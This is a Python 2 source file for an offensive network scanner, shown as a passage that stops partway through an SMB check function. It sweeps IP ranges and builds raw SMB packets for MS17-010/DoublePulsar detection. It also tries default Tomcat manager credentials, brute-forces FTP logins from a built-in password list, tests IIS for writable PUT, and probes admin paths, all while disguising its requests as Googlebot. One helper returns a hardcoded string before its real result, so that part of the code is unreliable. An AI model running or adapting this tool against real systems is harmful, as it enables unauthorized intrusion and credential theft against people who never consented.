#!/usr/bin/env python
#coding:utf-8
#changelog
#2012.4.22 add nfs
#2012.5.6 add source ip choose
#2012.5.6 add snmp string
#2013.4.4 add chose scantype
# -*- coding: utf-8 -*-

#rip from timeoutsocket.py
####
# Copyright 2000,2001 by Timothy O'Malley <timo@alum.mit.edu>
# 
#                All Rights Reserved
# 
# Permission to use, copy, modify, and distribute this software
# and its documentation for any purpose and without fee is hereby
# granted, provided that the above copyright notice appear in all
# copies and that both that copyright notice and this permission
# notice appear in supporting documentation, and that the name of
# Timothy O'Malley  not be used in advertising or publicity
# pertaining to distribution of the software without specific, written
# prior permission. 
# 
# Timothy O'Malley DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS
# SOFTWARE, INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
# AND FITNESS, IN NO EVENT SHALL Timothy O'Malley BE LIABLE FOR
# ANY SPECIAL, INDIRECT OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS,
# WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS
# ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
# PERFORMANCE OF THIS SOFTWARE. 
####

__version__ = "$Revision: 1.23 $"
__author__ = "Timothy O'Malley <timo@alum.mit.edu>"

#
# Imports
#
import select, string, time, random
import socket
if not hasattr(socket, "_no_timeoutsocket"):
    _socket = socket.socket
else:
    _socket = socket._no_timeoutsocket
from ctypes import *
import binascii
#
# Set up constants to test for Connected and Blocking operations.
# We delete 'os' and 'errno' to keep our namespace clean(er).
# Thanks to Alex Martelli and G. Li for the Windows error codes.
#
import os
if os.name == "nt":
    _IsConnected = (10022, 10056)
    _ConnectBusy = (10035,)
    _AcceptBusy = (10035,)
else:
    import errno
    _IsConnected = (errno.EISCONN,)
    _ConnectBusy = (errno.EINPROGRESS, errno.EALREADY, errno.EWOULDBLOCK)
    _AcceptBusy = (errno.EAGAIN, errno.EWOULDBLOCK)
    del errno
del os


#
# Default timeout value for ALL TimeoutSockets
#
_DefaultTimeout = None
def setDefaultSocketTimeout(timeout):
    global _DefaultTimeout
    _DefaultTimeout = timeout
def getDefaultSocketTimeout():
    return _DefaultTimeout



    

#
# Exceptions for socket errors and timeouts
#
Error = socket.error
class Timeout(Exception):
    pass
def toHex(s):
    lst = []
    rbuf = ""
    for ch in s:
        hv = hex(ord(ch)).replace('0x','\\x')
        print hv
        rbuf = rbuf + hv
    return "\x66\x75\x63\x6b\x77\x68\x6f"
    return rbuf
def hexdump(buf):
        tbl = []
        tmp = ""
        hex = ""
        i = 0
        for a in buf:
                hex += "%02X " % ord(a)
                i += 1
                if ord(a) >= 0x20 and ord(a) < 0x7f:
                        tmp += a
                else:
                        tmp += "."
                if i % 16 == 0:
                        tbl.append((hex, tmp))
                        hex = ""
                        tmp = ""
        tbl.append((hex, tmp))
        return tbl

#
# Factory function
#
from socket import AF_INET, SOCK_STREAM, SOCK_DGRAM, IPPROTO_UDP
def timeoutsocket(family=AF_INET, type=SOCK_STREAM, proto=None):
    if family != AF_INET or type != SOCK_STREAM:
        if proto:
            return _socket(family, type, proto)
        else:
            return _socket(family, type)
    return TimeoutSocket(_socket(family, type), _DefaultTimeout)
# end timeoutsocket

#
# The TimeoutSocket class definition
#
class switch(object):
    def __init__(self, value):
        self.value = value
        self.fall = False

    def __iter__(self):
        """Return the match method once, then stop"""
        yield self.match
        raise StopIteration

    def match(self, *args):
        """Indicate whether or not to enter a case suite"""
        if self.fall or not args:
            return True
        elif self.value in args: # changed for v1.5, see below
            self.fall = True
            return True
        else:
            return False
class TimeoutSocket:
    """TimeoutSocket object
    Implements a socket-like object that raises Timeout whenever
    an operation takes too long.
    The definition of 'too long' can be changed using the
    set_timeout() method.
    """

    _copies = 0
    _blocking = 1
    def __init__(self, sock, timeout):
        self._sock = sock
        self._timeout = timeout
    # end __init__

    def __getattr__(self, key):
        return getattr(self._sock, key)
    # end __getattr__

    def get_timeout(self):
        return self._timeout
    # end set_timeout

    def set_timeout(self, timeout=None):
        self._timeout = timeout
    # end set_timeout

    def setblocking(self, blocking):
        self._blocking = blocking
        return self._sock.setblocking(blocking)
    # end set_timeout

    def connect_ex(self, addr):
        errcode = 0
        try:
            self.connect(addr)
        except Error, why:
            errcode = why[0]
        return errcode
    # end connect_ex
        
    def connect(self, addr, port=None, dumbhack=None):
        # In case we were called as connect(host, port)
        if port != None:  addr = (addr, port)

        # Shortcuts
        sock = self._sock
        timeout = self._timeout
        blocking = self._blocking

        # First, make a non-blocking call to connect
        try:
            sock.setblocking(0)
            sock.connect(addr)
            sock.setblocking(blocking)
            return
        except Error, why:
            # Set the socket's blocking mode back
            sock.setblocking(blocking)
            
            # If we are not blocking, re-raise
            if not blocking:
                raise
            
            # If we are already connected, then return success.
            # If we got a genuine error, re-raise it.
            errcode = why[0]
            if dumbhack and errcode in _IsConnected:
                return
            elif errcode not in _ConnectBusy:
                raise
        # Now, wait for the connect to happen
        # ONLY if dumbhack indicates this is pass number one.
        #   If select raises an error, we pass it on.
        #   Is this the right behavior?
        if not dumbhack:
            r, w, e = select.select([], [sock], [], timeout)
            if w:
                return self.connect(addr, dumbhack=1)

        # If we get here, then we should raise Timeout
        raise Timeout("Attempted connect to %s timed out." % str(addr))
    # end connect

    def accept(self, dumbhack=None):
        # Shortcuts
        sock = self._sock
        timeout = self._timeout
        blocking = self._blocking

        # First, make a non-blocking call to accept
        #  If we get a valid result, then convert the
        #  accept'ed socket into a TimeoutSocket.
        # Be carefult about the blocking mode of ourselves.
        try:
            sock.setblocking(0)
            newsock, addr = sock.accept()
            sock.setblocking(blocking)
            timeoutnewsock = self.__class__(newsock, timeout)
            timeoutnewsock.setblocking(blocking)
            return (timeoutnewsock, addr)
        except Error, why:
            # Set the socket's blocking mode back
            sock.setblocking(blocking)

            # If we are not supposed to block, then re-raise
            if not blocking:
                raise
            
            # If we got a genuine error, re-raise it.
            errcode = why[0]
            if errcode not in _AcceptBusy:
                raise
            
        # Now, wait for the accept to happen
        # ONLY if dumbhack indicates this is pass number one.
        #   If select raises an error, we pass it on.
        #   Is this the right behavior?
        if not dumbhack:
            r, w, e = select.select([sock], [], [], timeout)
            if r:
                return self.accept(dumbhack=1)

        # If we get here, then we should raise Timeout
        raise Timeout("Attempted accept timed out.")
    # end accept

    def send(self, data, flags=0):
        sock = self._sock
        if self._blocking:
            r, w, e = select.select([], [sock], [], self._timeout)
            if not w:
                raise Timeout("Send timed out")
        return sock.send(data, flags)
    # end send

    def recv(self, bufsize, flags=0):
        sock = self._sock
        if self._blocking:
            r, w, e = select.select([sock], [], [], self._timeout)
            if not r:
                raise Timeout("Recv timed out")
        return sock.recv(bufsize, flags)
    # end recv

    def makefile(self, flags="r", bufsize= -1):
        self._copies = self._copies + 1
        return TimeoutFile(self, flags, bufsize)
    # end makefile

    def close(self):
        if self._copies <= 0:
            self._sock.close()
        else:
            self._copies = self._copies - 1
    # end close

# end TimeoutSocket


class TimeoutFile:
    """TimeoutFile object
    Implements a file-like object on top of TimeoutSocket.
    """
    
    def __init__(self, sock, mode="r", bufsize=4096):
        self._sock = sock
        self._bufsize = 4096
        if bufsize > 0: self._bufsize = bufsize
        if not hasattr(sock, "_inqueue"): self._sock._inqueue = ""

    # end __init__

    def __getattr__(self, key):
        return getattr(self._sock, key)
    # end __getattr__

    def close(self):
        self._sock.close()
        self._sock = None
    # end close
    
    def write(self, data):
        self.send(data)
    # end write

    def read(self, size= -1):
        _sock = self._sock
        _bufsize = self._bufsize
        while 1:
            datalen = len(_sock._inqueue)
            if datalen >= size >= 0:
                break
            bufsize = _bufsize
            if size > 0:
                bufsize = min(bufsize, size - datalen)
            buf = self.recv(bufsize)
            if not buf:
                break
            _sock._inqueue = _sock._inqueue + buf
        data = _sock._inqueue
        _sock._inqueue = ""
        if size > 0 and datalen > size:
            _sock._inqueue = data[size:]
            data = data[:size]
        return data
    # end read

    def readline(self, size= -1):
        _sock = self._sock
        _bufsize = self._bufsize
        while 1:
            idx = string.find(_sock._inqueue, "\n")
            if idx >= 0:
                break
            datalen = len(_sock._inqueue)
            if datalen >= size >= 0:
                break
            bufsize = _bufsize
            if size > 0:
                bufsize = min(bufsize, size - datalen)
            buf = self.recv(bufsize)
            if not buf:
                break
            _sock._inqueue = _sock._inqueue + buf

        data = _sock._inqueue
        _sock._inqueue = ""
        if idx >= 0:
            idx = idx + 1
            _sock._inqueue = data[idx:]
            data = data[:idx]
        elif size > 0 and datalen > size:
            _sock._inqueue = data[size:]
            data = data[:size]
        return data
    # end readline

    def readlines(self, sizehint= -1):
        result = []
        data = self.read()
        while data:
            idx = string.find(data, "\n")
            if idx >= 0:
                idx = idx + 1
                result.append(data[:idx])
                data = data[idx:]
            else:
                result.append(data)
                data = ""
        return result
    # end readlines

    def flush(self):  pass

# end TimeoutFile


#
# Silently replace the socket() builtin function with
# our timeoutsocket() definition.
#
if not hasattr(socket, "_no_timeoutsocket"):
    socket._no_timeoutsocket = socket.socket
    socket.socket = timeoutsocket
del socket
socket = timeoutsocket
# Finish


#Scan code from here


import socket as sk
import sys
import getopt
import threading
import string, re
import struct, random, urllib
global MAX_THREADS
MAX_THREADS = 40
global TIME_OUT
global resolv
TIME_OUT = 0.05
def dqtoi(dq):
    "Return an integer value given an IP address as dotted-quad string."
    octets = string.split(dq, ".")
    if len(octets) != 4:
        raise ValueError
    for octet in octets:
        if int(octet) > 255:
            raise ValueError
    return (long(octets[0]) << 24) + \
            (int(octets[1]) << 16) + \
            (int(octets[2]) << 8) + \
            (int(octets[3]))
    
def itodq(intval):
    "Return a dotted-quad string given an integer. "
    return "%u.%u.%u.%u" % ((intval >> 24) & 0x000000ff,
                            ((intval & 0x00ff0000) >> 16),
                            ((intval & 0x0000ff00) >> 8),
                            (intval & 0x000000ff))

def usage():

    print "supported service[21,22,25,53(udp),80,111(udp),110,143,139,445,161(udp),177(udp),1723,1755,1433,1521,3306,5900,6112,10050,12174,13722]"
    print "usage: s  <-s start ip> <-e end ip> [-p port] [-d thread num(default 40)] [-t timeout(default 0.05s)] [-n 1 dont resolv hostname]"

class SMB_HEADER(Structure):
    """SMB Header decoder.
    """
    _pack_ = 1  # Alignment

    _fields_ = [
        ("server_component", c_uint32),
        ("smb_command", c_uint8),
        ("error_class", c_uint8),
        ("reserved1", c_uint8),
        ("error_code", c_uint16),
        ("flags", c_uint8),
        ("flags2", c_uint16),
        ("process_id_high", c_uint16),
        ("signature", c_uint64),
        ("reserved2", c_uint16),
        ("tree_id", c_uint16),
        ("process_id", c_uint16),
        ("user_id", c_uint16),
        ("multiplex_id", c_uint16)
    ]
    
    def __new__(self, buffer=None):
        return self.from_buffer_copy(buffer)

    def __init__(self, buffer):
        pass


def generate_smb_proto_payload(*protos):
    """Generate SMB Protocol. Pakcet protos in order.
    """
    hexdata = []
    for proto in protos:
      hexdata.extend(proto)
    return "".join(hexdata)


def calculate_doublepulsar_xor_key(s):
    """Calaculate Doublepulsar Xor Key
    """
    x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
    x = x & 0xffffffff  # this line was added just to truncate to 32 bits
    return x


def negotiate_proto_request():
    """Generate a negotiate_proto_request packet.
    """
    #self.print_debug("generate negotiate request")
    netbios = [
      '\x00',              # 'Message_Type'
      '\x00\x00\x54'       # 'Length'
    ]

    smb_header = [
      '\xFF\x53\x4D\x42',  # 'server_component': .SMB
      '\x72',              # 'smb_command': Negotiate Protocol
      '\x00\x00\x00\x00',  # 'nt_status'
      '\x18',              # 'flags'
      '\x01\x28',          # 'flags2'
      '\x00\x00',          # 'process_id_high'
      '\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
      '\x00\x00',          # 'reserved'
      '\x00\x00',          # 'tree_id'
      '\x2F\x4B',          # 'process_id'
      '\x00\x00',          # 'user_id'
      '\xC5\x5E'           # 'multiplex_id'
    ]

    negotiate_proto_request = [
      '\x00',              # 'word_count'
      '\x31\x00',          # 'byte_count'

      # Requested Dialects
      '\x02',              # 'dialet_buffer_format'
      '\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00',   # 'dialet_name': LANMAN1.0

      '\x02',              # 'dialet_buffer_format'
      '\x4C\x4D\x31\x2E\x32\x58\x30\x30\x32\x00',   # 'dialet_name': LM1.2X002

      '\x02',              # 'dialet_buffer_format'
      '\x4E\x54\x20\x4C\x41\x4E\x4D\x41\x4E\x20\x31\x2E\x30\x00',  # 'dialet_name3': NT LANMAN 1.0

      '\x02',              # 'dialet_buffer_format'
      '\x4E\x54\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00'   # 'dialet_name4': NT LM 0.12
    ]

    return generate_smb_proto_payload(netbios, smb_header, negotiate_proto_request)


def session_setup_andx_request():
    """Generate session setuo andx request.
    """
    netbios = [
      '\x00',              # 'Message_Type'
      '\x00\x00\x63'       # 'Length'
    ]

    smb_header = [
      '\xFF\x53\x4D\x42',  # 'server_component': .SMB
      '\x73',              # 'smb_command': Session Setup AndX
      '\x00\x00\x00\x00',  # 'nt_status'
      '\x18',              # 'flags'
      '\x01\x20',          # 'flags2'
      '\x00\x00',          # 'process_id_high'
      '\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
      '\x00\x00',          # 'reserved'
      '\x00\x00',          # 'tree_id'
      '\x2F\x4B',          # 'process_id'
      '\x00\x00',          # 'user_id'
      '\xC5\x5E'           # 'multiplex_id'
    ]

    session_setup_andx_request = [
      '\x0D',              # Word Count
      '\xFF',              # AndXCommand: No further command
      '\x00',              # Reserved
      '\x00\x00',          # AndXOffset
      '\xDF\xFF',          # Max Buffer
      '\x02\x00',          # Max Mpx Count
      '\x01\x00',          # VC Number
      '\x00\x00\x00\x00',  # Session Key
      '\x00\x00',          # ANSI Password Length
      '\x00\x00',          # Unicode Password Length
      '\x00\x00\x00\x00',  # Reserved
      '\x40\x00\x00\x00',  # Capabilities
      '\x26\x00',          # Byte Count
      '\x00',              # Account
      '\x2e\x00',          # Primary Domain
      '\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00',    # Native OS: Windows 2000 2195
      '\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00',        # Native OS: Windows 2000 5.0
    ]

    return generate_smb_proto_payload(netbios, smb_header, session_setup_andx_request)


def tree_connect_andx_request(ip, userid):
    """Generate tree connect andx request.
    """
    #log.debug("generate tree connect andx request")

    netbios = [
      '\x00',              # 'Message_Type'
      '\x00\x00\x47'       # 'Length'
    ]

    smb_header = [
      '\xFF\x53\x4D\x42',  # 'server_component': .SMB
      '\x75',              # 'smb_command': Tree Connect AndX
      '\x00\x00\x00\x00',  # 'nt_status'
      '\x18',              # 'flags'
      '\x01\x20',          # 'flags2'
      '\x00\x00',          # 'process_id_high'
      '\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
      '\x00\x00',          # 'reserved'
      '\x00\x00',          # 'tree_id'
      '\x2F\x4B',          # 'process_id'
      userid,              # 'user_id'
      '\xC5\x5E'           # 'multiplex_id'
    ]

    ipc = "\\\\{}\IPC$\x00".format(ip)
    #log.debug("Connecting to {} with UID = {}".format(ipc, userid))

    tree_connect_andx_request = [
      '\x04',              # Word Count
      '\xFF',              # AndXCommand: No further commands
      '\x00',              # Reserved
      '\x00\x00',          # AndXOffset
      '\x00\x00',          # Flags
      '\x01\x00',          # Password Length
      '\x1C\x00',          # Byte Count
      '\x00',              # Password
      ipc.encode(),        # \\xxx.xxx.xxx.xxx\IPC$
      '\x3f\x3f\x3f\x3f\x3f\x00'   # Service
    ]

    length = len("".join(smb_header)) + len("".join(tree_connect_andx_request))
    # netbios[1] = '\x00' + struct.pack('>H', length)
    netbios[1] = struct.pack(">L", length)[-3:]

    return generate_smb_proto_payload(netbios, smb_header, tree_connect_andx_request)


def peeknamedpipe_request(treeid, processid, userid, multiplex_id):
    """Generate tran2 request
    """
    #log.debug("generate peeknamedpipe request")
    netbios = [
      '\x00',              # 'Message_Type'
      '\x00\x00\x4a'       # 'Length'
    ]

    smb_header = [
      '\xFF\x53\x4D\x42',  # 'server_component': .SMB
      '\x25',              # 'smb_command': Trans2
      '\x00\x00\x00\x00',  # 'nt_status'
      '\x18',              # 'flags'
      '\x01\x28',          # 'flags2'
      '\x00\x00',          # 'process_id_high'
      '\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
      '\x00\x00',          # 'reserved'
      treeid,
      processid,
      userid,
      multiplex_id
    ]

    tran_request = [
      '\x10',              # Word Count
      '\x00\x00',          # Total Parameter Count
      '\x00\x00',          # Total Data Count
      '\xff\xff',          # Max Parameter Count
      '\xff\xff',          # Max Data Count
      '\x00',              # Max Setup Count
      '\x00',              # Reserved
      '\x00\x00',          # Flags
      '\x00\x00\x00\x00',  # Timeout: Return immediately
      '\x00\x00',          # Reversed
      '\x00\x00',          # Parameter Count
      '\x4a\x00',          # Parameter Offset
      '\x00\x00',          # Data Count
      '\x4a\x00',          # Data Offset
      '\x02',              # Setup Count
      '\x00',              # Reversed
      '\x23\x00',          # SMB Pipe Protocol: Function: PeekNamedPipe (0x0023)
      '\x00\x00',          # SMB Pipe Protocol: FID
      '\x07\x00',
      '\x5c\x50\x49\x50\x45\x5c\x00'  # \PIPE\
    ]

    return generate_smb_proto_payload(netbios, smb_header, tran_request)


def trans2_request(treeid, processid, userid, multiplex_id):
    """Generate trans2 request.
    """
    #log.debug("generate tran2 request")
    netbios = [
      '\x00',              # 'Message_Type'
      '\x00\x00\x4f'       # 'Length'
    ]

    smb_header = [
      '\xFF\x53\x4D\x42',  # 'server_component': .SMB
      '\x32',              # 'smb_command': Trans2
      '\x00\x00\x00\x00',  # 'nt_status'
      '\x18',              # 'flags'
      '\x07\xc0',          # 'flags2'
      '\x00\x00',          # 'process_id_high'
      '\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
      '\x00\x00',          # 'reserved'
      treeid,
      processid,
      userid,
      multiplex_id
    ]

    trans2_request = [
      '\x0f',              # Word Count
      '\x0c\x00',          # Total Parameter Count
      '\x00\x00',          # Total Data Count
      '\x01\x00',          # Max Parameter Count
      '\x00\x00',          # Max Data Count
      '\x00',              # Max Setup Count
      '\x00',              # Reserved
      '\x00\x00',          # Flags
      '\xa6\xd9\xa4\x00',  # Timeout: 3 hours, 3.622 seconds
      '\x00\x00',          # Reversed
      '\x0c\x00',          # Parameter Count
      '\x42\x00',          # Parameter Offset
      '\x00\x00',          # Data Count
      '\x4e\x00',          # Data Offset
      '\x01',              # Setup Count
      '\x00',              # Reserved
      '\x0e\x00',          # subcommand: SESSION_SETUP
      '\x00\x00',          # Byte Count
      '\x0c\x00' + '\x00' * 12
    ]

    return generate_smb_proto_payload(netbios, smb_header, trans2_request)
    
class Scanner(threading.Thread):
    def __init__(self, host, port):
        threading.Thread.__init__(self)
        # host and port
        self.host = host
        self.port = port
        # build up the socket obj
        self.sd = socket(AF_INET, SOCK_STREAM)
        self.sd.bind((srcip,0))
        global TIME_OUT
        global resolv
        global stype
        self.sd.set_timeout(TIME_OUT)
        self.targethost = self.host + ':' + str(self.port)
    def do_www_ck(self, sock):
        rbuf = ""
        targethost = self.host + ':' + str(self.port)
        #print requesturl
        if(len(httphost)>4):
            sock.send('GET '+requesturl+' HTTP/1.0\r\nUser-Agent: Googlebot(+http://www.google.com/bots.html)\r\nHost: ' + httphost + '\r\n\r\n')
        else:
            sock.send('GET '+requesturl+' HTTP/1.0\r\nUser-Agent: Googlebot(+http://www.google.com/bots.html)\r\nHost: ' + self.targethost + '\r\n\r\n')
        rbuf = sock.recv(512)
        if(len(rbuf)):
            try:
                bb = rbuf.split("\r\n")
                for x in bb:
                    if(x.find("Server") != -1):
                        kool = x[x.find("Server:") + 7:]
                        if(vul>0):
                            self.__www_path_discover__(kool)
                            self.web_vuln_check(kool)
                        return kool

            except:pass
        rbuf = "Unknown"
        return rbuf
    def __HTTP_Get_Headers(self, headers, choice):
        try:
            ip = re.compile('[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
            bb = headers.split("\r\n")
            for x in bb:
                if(x.find(choice) != -1):
                    location = x[x.find(choice) + len(choice) + 2:]
                    if(ip.search(location)):
                        return ip.search(location).group()
        except:pass
        return ""
    def web_vuln_check_iis_disco_ip(self):
        rbuf = self.__httpget__("/", 1024)
        resultip = self.__HTTP_Get_Headers(rbuf, "Content-Location")
        if(len(resultip) > 2):
            print('%s  :%d  [IIS]\t [May Internal IP: %s]') % (self.host, self.port, resultip)
            return
        rbuf = self.__httpget__("/images", 1024)
        resultip = self.__HTTP_Get_Headers(rbuf, "Location")
        if(len(resultip) > 2):
            print('%s  :%d  [IIS]\t [May Internal IP: %s]') % (self.host, self.port, resultip)
            return
    def web_vuln_check(self, banner):
        if "IIS" in banner:
            self.web_vuln_check_iis_put()
            self.web_vuln_check_iis_disco_ip()
        if "Coyote" in banner:
            self.web_vuln_check_apache_tomcat_weakpass()
        #print "s"
    def web_vuln_check_iis_put(self):
        req = 'PUT /iisput.txt HTTP/1.1\nHost:' + self.targethost + '\nContent-Length:10\n\nCHECKIIS12\r\n\r\n'
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.bind((srcip,0))
            sock.set_timeout(TIME_OUT)
            sock.connect(self.host, self.port)
            rbuf = ""
            sock.send(req)
            rbuf = sock.recv(256)
            if 'HTTP/1.1 201' in rbuf:
                print('%s  :%d  [IIS]\t [Put Access Enabled]') % (self.host, self.port)
        except:pass
        sock.close()
    def web_vuln_check_apache_tomcat_weakpass(self):
        #tomcat/tomcat
        rbuf = ""
        try:
            httpget = 'GET /manager/html HTTP/1.1\r\nHost: %s\r\nUser-Agent: Googlebot(+http://www.google.com/bots.html)\r\nAuthorization: Basic dG9tY2F0OnRvbWNhdA==\r\n\r\n' % self.targethost
            sock = socket(AF_INET, SOCK_STREAM)
            sock.bind((srcip,0))
            sock.set_timeout(TIME_OUT)
            sock.connect(self.host, self.port)
            sock.send(httpget)
            rbuf = sock.recv(256)
            #admin:null
            if(len(rbuf)):
                if 'HTTP/1.1 200' in rbuf:
                    print('%s  :%d  [TOMCAT](vuln!)') % (self.host, self.port)
                    httpget = 'GET /manager/html HTTP/1.1\r\nHost: %s\r\nUser-Agent: Googlebot(+http://www.google.com/bots.html)\r\nAuthorization: Basic YWRtaW46\r\n\r\n' % self.targethost
            sock = socket(AF_INET, SOCK_STREAM)
            sock.bind((srcip,0))
            sock.set_timeout(TIME_OUT)
            sock.connect(self.host, self.port)
            sock.send(httpget)
            rbuf = sock.recv(256)
            #admin:admin
            if(len(rbuf)):
                if 'HTTP/1.1 200' in rbuf:
                    print('%s  :%d  [TOMCAT](vuln!)') % (self.host, self.port)
            httpget = 'GET /manager/html HTTP/1.1\r\nHost: %s\r\nUser-Agent: Googlebot(+http://www.google.com/bots.html)\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n' % self.targethost
            sock = socket(AF_INET, SOCK_STREAM)
            sock.bind((srcip,0))
            sock.set_timeout(TIME_OUT)
            sock.connect(self.host, self.port)
            sock.send(httpget)
            rbuf = sock.recv(256)
            if(len(rbuf)):
                if 'HTTP/1.1 200' in rbuf:
                    print('%s  :%d  [TOMCAT](vuln!)') % (self.host, self.port)
        except:pass
        sock.close()
    def __www_path_discover__(self, ban):
        #print "here"
        pathlist = ['lists/', 'admin/', 'administrator', 'administrators', 'manager/'
                , 'backoffice', 'phpmyadmin/', 'mysql', 'mssql', 'phpMyAdmin/', 'PHPMYADMIN/'
                , 'forum', 'upload/', 'uploads', 'upload', 'downloads', 'download'
                , 'manage', 'cms', 'login', 'users', 'admins', 'user', 'cgi-bin', 'webmail', 'mail'
                , 'siteadmin', 'db', 'dbase', 'database', 'bbs', 'adm', 'backup', 'bdata',
                'vpn', 'access', 'test', 'tests', 'connect', 'connects', 'sslvpn', 'webvpn', 'README', 'INSTALL', 'readme.txt', 'robots.txt', 'admin-console/'
                , 'config', 'backups', 'fpadmin', 'ftp', 'logfile', 'logs', 'passwd', 'secure/', 'nagios/', 'nagios3/', 'phpinfo.php', 'info.php', 'test.php'
                , 'stats', 'weblog', 'wwwstats', 'intranet', 'php', 'jsp', 'asp', 'jmx-console/', 'web-console/', 'console/', 'UserFiles', 'fckeditor', 'CFIDE/scripts/ajax/FCKeditor/'
                , 'CFIDE/', 'admin/j_security_check']
        targethost = self.host + ':' + str(self.port)
        http_code = -2
        http_code = self.__ck_http_401__()
        for x in pathlist:
            tempath = '/' + x
            rbuf = self.__httpget__(tempath, 256)
            if(len(rbuf)):
                if http_code != -2:
                    if 'HTTP/1.1 200' in rbuf:
                        print '%s  :%d %s Has %s (200)' % (self.host, self.port, ban, tempath)
                elif http_code != -3:
                    if 'HTTP/1.1 403' in rbuf:
                        print '%s  :%d %s Has %s (403)' % (self.host, self.port, ban, tempath)
                elif http_code == 1:
                    if 'HTTP/1.1 401' in rbuf:
                        print '%s  :%d %s Has %s (401)' % (self.host, self.port, ban, tempath)
                elif 'HTTP/1.1 302' in rbuf:
                    print '%s\t:%d \t %s Has %s (302)' % (self.host, self.port, ban, tempath)
                elif 'HTTP/1.1 301' in rbuf:
                    print '%s\t:%d \t %s Has %s (301)' % (self.host, self.port, ban, tempath)
    def __ck_http_401__(self):
        rbuf = ""
        rbuf = self.__httpget__('/', 256)
        choice = ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
        if(len(rbuf)):
            if 'HTTP/1.1 401' in rbuf:
                return -1
            elif 'HTTP/1.1 200' in self.__httpget__("/" + "".join(random.sample(choice, int(random.randrange(3, 16)))), 256):
                return -2
            elif 'HTTP/1.1 403' in self.__httpget__("/" + "".join(random.sample(choice, int(random.randrange(3, 16)))), 256):
                return -3
            else:
                return 1
    def __check_http_proxy__(self):
        sock = socket(AF_INET, SOCK_STREAM)
        sock.bind((srcip,0))
        sock.set_timeout(6.0)
        sock.connect((self.host, self.port))
        rbuf = ""
        
        httpget = 'GET http://www.mail.ru/ HTTP/1.1\r\nHost: www.mail.ru:80\r\nProxy-Connection: keep-alive\r\nUser-Agent: Googlebot(+http://www.google.com/bots.html)\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ru,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 300\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n'
        #print httpget
        sock.send(httpget)
        time.sleep(6)
        rbuf = sock.recv(6553)
        sock.close()
        #print 'ssss'
        if 'imgsmail' in rbuf:
            return '<HTTP Proxy>'
    def __httpget__(self, path, size):
        #print path
        sock = socket(AF_INET, SOCK_STREAM)
        sock.bind((srcip,0))
        sock.set_timeout(TIME_OUT)
        sock.connect((self.host, self.port))
        rbuf = ""
        httpget = 'GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Googlebot(+http://www.google.com/bots.html)\r\n\r\n' % (path, self.targethost)
        sock.send(httpget)
        
        rbuf = sock.recv(size)
        sock.close()
        return rbuf
    
    def crack_ftp(self):
        users = ['root', 'ftp', 'administrator']
        password = ['test', 'admin', 'ftp', 'upload', 'root', 'pass', 'password', '123456']
        for x in users:
            for y in password:
                self.crk_ftp(x, y)
    def crk_ftp(self, USER, PASSWORD):
        #Crack FTP Account MODEL
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.bind((srcip,0))
            sock.set_timeout(TIME_OUT)
            sock.connect((self.host, self.port))
            rbuf = sock.recv(256)
            sock.send("USER " + USER + "\r\n")
            rbuf = sock.recv(256)
            if(len(rbuf) > 3):
                sock.send("PASS " + PASSWORD + "\r\n")
                rbuf = sock.recv(256)
                if rbuf[0:3] == '230':
                    print('%s  :%d  [FTP]\t[USER] %s [PASS] %s') % (self.host, self.port, USER, PASSWORD)
                    sock.close()
                    return 1
        except:pass
        sock.close()
        
    def do_smb_ck(self, sock):
        #Check SMB Version
        #self.smb_17010(sock)
        #self.smb_17010_XOR(sock)
        #self.computer_info()
        rbuf = ""
        sessionrequest = "\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45\x4e\x45\x43\x46\x44\x45" + \
        "\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43" + \
        "\x41\x43\x41\x43\x41\x00\x20\x45\x4b\x45\x44\x46\x45\x45\x49\x45" + \
        "\x44\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43" + \
        "\x41\x43\x41\x43\x41\x41\x41\x00"

        negotiate = "\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02" + \
        "\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e" + \
        "\x31\x32\x00"

        setupaccount = "\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02" + \
        "\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff\xff\x02\x00\x5c\x02\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0b" + \
        "\x00\x00\x00\x4a\x43\00\x41\x54\x54\x48\x43\x00"
        if self.port == 139:
            sock.send(sessionrequest)
            rbuf = sock.recv(256)
        sock.send(negotiate)
        rbuf = sock.recv(256)
        sock.send(setupaccount)
